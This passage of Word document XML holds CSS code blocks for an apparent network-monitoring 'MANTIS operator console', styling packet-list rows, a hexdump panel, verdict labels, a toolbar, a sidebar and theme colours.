    <w:p w14:paraId="06CD239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 1px solid rgba(59, 130, 246, 0.3);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06DC1F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5A9513E" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0B9E9EE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Wireshark View Styles */</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F43B70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.wireshark-row {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43D236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font-family: 'JetBrains Mono', monospace;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72726F1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12px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B1DAC6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C6C222B" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4B67A64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.ws-TCP {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6263101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#a3e635;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D6E21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5011922" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="262E1F1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.ws-UDP {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="526BAB3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#38bdf8;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="079452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02C983D" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="29D9436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.ws-ICMP {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EFBF8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#f472b6;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7379FD4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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29F75DE6" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="11D9FB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.ws-MALICIOUS {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="729E9B2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var(--accent-red);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49B213C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rgba(239, 68, 68, 0.1);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FADD4E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ACE1F79" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="309A589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.ws-OTHER {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C44BD4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#94a3b8;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="641EC1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AEF9B57" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="25270E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.wireshark-row {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6657CFA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cursor: pointer;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51C71F4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F08A5B0" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="69C92D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.wireshark-row.selected td {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65D6E1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rgba(59, 130, 246, 0.15);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FA24A9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10158FFB" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="264137F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Packet viewer toolbar */</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F0D103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.pkt-toolbar {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2334EA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flex;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4019B6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flex-wrap: wrap;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35724D1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gap: 10px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D04EF0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align-items: center;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4153DBA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margin-bottom: 16px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="491E815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254C11F" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="788185E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.pkt-toolbar input[type="text"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BFB896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.pkt-toolbar select {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BD2DFC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var(--bg-card);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03E09BD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 1px solid var(--border-color);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AC704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var(--text-main);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2003D52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8px 12px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E15E7C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border-radius: 6px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="396A961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13px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="490DACE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font-family: 'Inter', sans-serif;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CAFEA7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3C3E147" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3CA644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.pkt-toolbar input[type="text"] {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51913A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min-width: 240px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B7477E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E298E4C" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2B44D33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.pkt-btn {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A6814D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var(--bg-card);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55F43B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 1px solid var(--border-color);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="159B443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var(--text-main);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0095AE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8px 14px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="095361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border-radius: 6px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5ED9DE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13px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="672707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cursor: pointer;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F5A528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500;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="271D648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text-decoration: none;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DA76F0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inline-flex;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B5C53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align-items: center;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FF30F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gap: 6px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AB00D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F028566" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0EC45FB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.pkt-btn:hover {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E99AC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var(--bg-card-hover);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0881581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51D2087" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2975C16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.pkt-btn.paused {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25891E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rgba(239, 68, 68, 0.15);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1857801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border-color: rgba(239, 68, 68, 0.4);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FD8A5E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var(--accent-red);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="656067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E7C07C2" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="37426BD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.pkt-chip {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A3063E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font-family: 'JetBrains Mono', monospace;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D74BF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12px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02D7E9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var(--text-muted);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3018977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A76CA2E" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7A37286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.pkt-chip b {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="311665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var(--accent-green);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4339A32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1535CB85" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4BCD5C7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.hexdump {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="206064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font-family: 'JetBrains Mono', monospace;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D0C6D9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12.5px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50D58BC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line-height: 1.5;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B61360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#cbd5e1;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B627C5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16px 20px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C49E31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 0;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="599A95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white-space: pre;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A66DBD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overflow-x: auto;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="770BCC3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#0b0d13;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AA684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13F455E" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7354E08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.verdict-MALICIOUS {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A3713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color: var(--accent-red);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DF70D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700;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19CCCCB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0D5BE86" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="02FB10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.verdict-BLACKLIST {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74A814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var(--accent-purple);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F1E5B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700;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7ABA9C1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40339AE" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6AC8B6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Document/Project View */</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="311CBA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.doc-view {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36295FB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max-width: 800px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C48A63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line-height: 1.6;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A1DB6E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14px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20FE2F1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#cbd5e1;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5261F6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padding-bottom: 40px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1333AD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0A68299" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4EED108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.doc-view h2 {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77A103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var(--text-main);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="771AF4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border-bottom: 1px solid var(--border-color);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6025EBB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padding-bottom: 10px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29D1BC5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E33AAD9" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4F2E45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.doc-view h3 {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D1D396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var(--accent-blue);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="252F16A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margin-top: 24px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A84EB6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border-bottom: 1px dashed var(--border-color);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78475C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padding-bottom: 5px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64BA60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D070717" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="71A7D8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.arch-engine {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F1CC92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rgba(0, 0, 0, 0.2);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E5DCDC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border-left: 3px solid var(--accent-purple);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FAC72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16px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65A1763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 16px 0;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E409C4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border-radius: 0 8px 8px 0;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FB845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B4F4D7E" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1C5C96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Charts --- */</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26FD91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.chart-container {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68B3BF6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position: relative;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52C388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height: 60px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="325A356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width: 100%;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49C09D3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margin-top: 10px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D5D3D0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CFADF6D" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3F5A471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MANTIS operator console */</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="056720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:root {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="605FE08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--bg-main: #f1f4f3;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="593499A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--bg-nav: #0d1a20;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51F70E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--bg-card: #ffffff;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DE7E03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--bg-card-hover: #f7faf9;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="139262B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--text-main: #142229;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71E20F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--text-muted: #68777d;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="087A69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--accent-green: #16836f;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B40CE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--accent-blue: #266d84;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="603A0CF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--accent-red: #b83b49;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E0F721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--accent-orange: #ad6a12;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21997FF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--accent-purple: #675a91;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18CF719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--border-color: #dbe3e1;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69446FA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--nav-text: #a6b4b9;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="017D8C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--nav-active: #ffffff;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4888C03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--shadow-sm: 0 1px 2px rgba(13, 26, 32, 0.05);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41432C5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908DE8C" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="744E6BA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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F8430B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box-sizing: border-box;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D4CE6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A326049" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="59A4B0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html {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E1132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var(--bg-main);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14CFBC4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075CFD3" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="42B28CB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body {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56CC67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font-family: Inter, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AAF433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var(--bg-main);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30B20D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var(--text-main);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39CD875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min-width: 320px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CCD84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136F334F" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2C101E7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.sidebar {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="016C86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width: 248px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B6278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flex: 0 0 248px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BC32D5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var(--bg-nav);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19B0633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border-right: 0;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EDAF6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box-shadow: 8px 0 24px rgba(13, 26, 32, 0.04);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51286A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1680F783" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6CA4236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.logo-container {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FEECC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min-height: 76px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37276F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padding: 18px 22px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EDAA8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gap: 12px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="257830A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border-bottom: 1px solid rgba(255, 255, 255, 0.08);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EEF28A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7F721B4" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2ED4AF1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.brand-mark {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="304EB2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width: 36px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5619C6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height: 36px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35E1EB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position: relative;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="370632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 1px solid rgba(116, 216, 193, 0.38);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03D68AF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border-radius: 50%;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="589E89B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grid;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5516E7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place-items: center;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AB1BEE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#ffffff;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FF4FF5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font-family: "SFMono-Regular", Consolas, monospace;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34F507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13px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3726B6A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700;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6339BA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letter-spacing: -0.02em;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38ADC89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#126b60;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DF4F27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box-shadow: inset 0 0 0 4px #0f554f;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3905AB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995D332" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="73D3F6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.brand-mark::after {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="259A4A2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content: "";</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B1C1C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width: 4px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="707F36C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height: 4px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B64E1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position: absolute;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4821812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right: 2px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4864A4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top: 8px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58080C4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border-radius: 50%;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47CC061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#8be0c9;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="791180D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box-shadow: 0 0 0 2px rgba(139, 224, 201, 0.16);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F8850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1B7AD428" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5229CB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.logo-container h1 {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2871374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#ffffff;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A62A5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16px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="556343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letter-spacing: 0.08em;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C2E27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1A3EF01" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3914DA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.logo-subtitle {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7019967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margin-top: 3px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20AF8B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#87949f;</w:t>
      </w:r>
    </w:p>
